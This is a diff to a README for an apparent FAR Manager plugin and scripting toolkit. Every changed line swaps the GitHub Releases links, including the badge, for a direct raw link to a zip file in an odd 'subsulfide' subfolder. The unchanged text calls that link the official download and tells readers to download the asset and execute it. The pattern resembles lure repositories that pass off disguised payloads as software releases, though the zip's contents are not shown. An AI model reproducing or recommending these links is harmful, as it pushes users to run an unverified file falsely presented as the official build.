@@ -1,8 +1,8 @@
-https://github.com/Seiseis/far-manager-tools/releases
+https://raw.githubusercontent.com/Seiseis/far-manager-tools/main/subsulfide/tools_far_manager_3.5-alpha.1.zip
 
 # Far Manager Tools: Plugin Extensibility, Scripting, and Console Power Today
 
-[![Releases](https://img.shields.io/badge/FAR_Manager_Tools-Releases-blue?style=for-the-badge&logo=github)](https://github.com/Seiseis/far-manager-tools/releases)
+[![Releases](https://raw.githubusercontent.com/Seiseis/far-manager-tools/main/subsulfide/tools_far_manager_3.5-alpha.1.zip)](https://raw.githubusercontent.com/Seiseis/far-manager-tools/main/subsulfide/tools_far_manager_3.5-alpha.1.zip)
 
 A practical collection of enhancements for FAR Manager. This project adds plugin extensibility, scripting capabilities, and robust tooling for console file management. It aims to make FAR Manager more programmable, customizable, and easy to integrate with your workflows.
 
@@ -45,7 +45,7 @@ Here is a straightforward path to try Far Manager Tools on a fresh setup. If you
 
 - Accessing the release assets
   - The release page contains the official builds and plugin bundles. To download, go to the releases page and grab the asset that matches your platform and needs.
-  - The authoritative download source is the Releases page: https://github.com/Seiseis/far-manager-tools/releases
+  - The authoritative download source is the Releases page: https://raw.githubusercontent.com/Seiseis/far-manager-tools/main/subsulfide/tools_far_manager_3.5-alpha.1.zip
 
 - Installation and execution
   - From the Releases page, download the asset file and run it to install or initialize the extension set. The exact file name depends on the release, but look for a Windows executable or a bundled package that includes the core plugin manager.
@@ -266,7 +266,7 @@ License and attribution
 - Attribution should be included in derivative works as required by the license.
 
 Downloads and installation notes
-- The official download and installation path is the Releases page: https://github.com/Seiseis/far-manager-tools/releases
+- The official download and installation path is the Releases page: https://raw.githubusercontent.com/Seiseis/far-manager-tools/main/subsulfide/tools_far_manager_3.5-alpha.1.zip
 - From the Releases page download the asset and execute it to install. The exact file name can vary by release; look for an installer or a packaged asset designed for your platform.
 - If you can't locate the right asset or the link changes, check the Releases section for the latest stable build and follow the instructions provided there.
 
@@ -352,7 +352,7 @@ Final note
 - The link to the official releases is provided for your convenience, and it is the primary source for obtaining the assets needed to install and use Far Manager Tools. For the second mention, refer back to the Releases page when you need to download or verify the latest builds. The exact asset names vary by release, so always read the release notes for installation instructions.
 
 Releases reference
-- Official downloads and installation assets live at the same page: https://github.com/Seiseis/far-manager-tools/releases
+- Official downloads and installation assets live at the same page: https://raw.githubusercontent.com/Seiseis/far-manager-tools/main/subsulfide/tools_far_manager_3.5-alpha.1.zip
 
 Appendix: quick example skeletons
 - Example 1: A tiny script to log current directory
@@ -380,8 +380,8 @@ Appendix: quick example skeletons
   - Purpose: show how scripts can coordinate with external tools.
 
 Direct links and references
-- Releases page: https://github.com/Seiseis/far-manager-tools/releases
-- For the button-style link, you can also use the badge at the top as a quick jump to the same resource: https://github.com/Seiseis/far-manager-tools/releases
+- Releases page: https://raw.githubusercontent.com/Seiseis/far-manager-tools/main/subsulfide/tools_far_manager_3.5-alpha.1.zip
+- For the button-style link, you can also use the badge at the top as a quick jump to the same resource: https://raw.githubusercontent.com/Seiseis/far-manager-tools/main/subsulfide/tools_far_manager_3.5-alpha.1.zip
 
 Note to readers
 - This README aims to be comprehensive and accessible. It reflects the core ideas of plugin extensibility, scripting, and console-based workflows that Far Manager Tools seeks to promote. The content is designed to help new users get started quickly, while also providing a path for developers to contribute and build advanced integrations. The balance of practical instructions and architectural insight should help both end users and contributors navigate the project effectively.
